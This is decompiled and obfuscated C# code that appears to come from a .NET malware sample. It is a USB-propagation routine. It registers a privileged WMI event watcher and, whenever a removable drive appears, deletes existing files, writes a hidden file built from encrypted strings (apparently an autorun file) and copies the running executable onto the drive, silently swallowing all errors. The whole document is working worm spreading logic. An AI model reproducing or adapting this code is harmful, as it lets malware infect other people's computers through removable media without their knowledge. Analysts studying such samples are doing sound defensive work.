using System;
using System.IO;
using System.Management;
using ns0;

namespace ns3;

internal class Class6
{
	private static ManagementEventWatcher managementEventWatcher_0;

	public static void smethod_0()
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_001d: Expected O, but got Unknown
		//IL_0045: Unknown result type (might be due to invalid IL or missing references)
		//IL_004f: Expected O, but got Unknown
		//IL_005b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0065: Expected O, but got Unknown
		try
		{
			ManagementScope val = new ManagementScope(_003CPrivateImplementationDetails_003E_007B1A79D80D_002D5413_002D4269_002DAB56_002D5064970F91A2_007D.smethod_33());
			val.get_Options().set_EnablePrivileges(true);
			WqlEventQuery val2 = new WqlEventQuery();
			val2.set_EventClassName(_003CPrivateImplementationDetails_003E_007B1A79D80D_002D5413_002D4269_002DAB56_002D5064970F91A2_007D.smethod_34());
			val2.set_WithinInterval(new TimeSpan(0, 0, 1));
			val2.set_Condition(_003CPrivateImplementationDetails_003E_007B1A79D80D_002D5413_002D4269_002DAB56_002D5064970F91A2_007D.iK());
			WqlEventQuery val3 = val2;
			managementEventWatcher_0 = new ManagementEventWatcher(val, (EventQuery)(object)val3);
			managementEventWatcher_0.add_EventArrived(new EventArrivedEventHandler(smethod_2));
			managementEventWatcher_0.Start();
		}
		catch
		{
		}
	}

	public static void smethod_1()
	{
		//Error decoding local variables: Signature type sequence must have at least one element.
		try
		{
			managementEventWatcher_0.Stop();
		}
		catch
		{
		}
	}

	private static void smethod_2(object sender, EventArrivedEventArgs e)
	{
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (!driveInfo.IsReady || driveInfo.DriveType != DriveType.Removable)
			{
				continue;
			}
			try
			{
				string[] array = new string[2]
				{
					driveInfo.Name + _003CPrivateImplementationDetails_003E_007B1A79D80D_002D5413_002D4269_002DAB56_002D5064970F91A2_007D.smethod_35(),
					driveInfo.Name + _003CPrivateImplementationDetails_003E_007B1A79D80D_002D5413_002D4269_002DAB56_002D5064970F91A2_007D.smethod_36()
				};
				string[] array2 = array;
				foreach (string path in array2)
				{
					if (File.Exists(path))
					{
						File.Delete(path);
					}
				}
				using (StreamWriter streamWriter = new StreamWriter(new FileStream(array[0], FileMode.Create, FileAccess.Write)))
				{
					streamWriter.Write(_003CPrivateImplementationDetails_003E_007B1A79D80D_002D5413_002D4269_002DAB56_002D5064970F91A2_007D.smethod_37());
					streamWriter.Write(_003CPrivateImplementationDetails_003E_007B1A79D80D_002D5413_002D4269_002DAB56_002D5064970F91A2_007D.smethod_38());
					streamWriter.Write(_003CPrivateImplementationDetails_003E_007B1A79D80D_002D5413_002D4269_002DAB56_002D5064970F91A2_007D.smethod_39());
					streamWriter.Write(_003CPrivateImplementationDetails_003E_007B1A79D80D_002D5413_002D4269_002DAB56_002D5064970F91A2_007D.smethod_40());
					streamWriter.Write(_003CPrivateImplementationDetails_003E_007B1A79D80D_002D5413_002D4269_002DAB56_002D5064970F91A2_007D.smethod_41());
					streamWriter.Flush();
					streamWriter.Close();
				}
				File.Copy(Class12.string_0, array[1], overwrite: true);
				File.SetAttributes(array[0], File.GetAttributes(array[0]) | FileAttributes.Hidden);
				File.SetAttributes(array[1], FileAttributes.Archive | FileAttributes.Normal);
			}
			catch
			{
			}
		}
	}
}
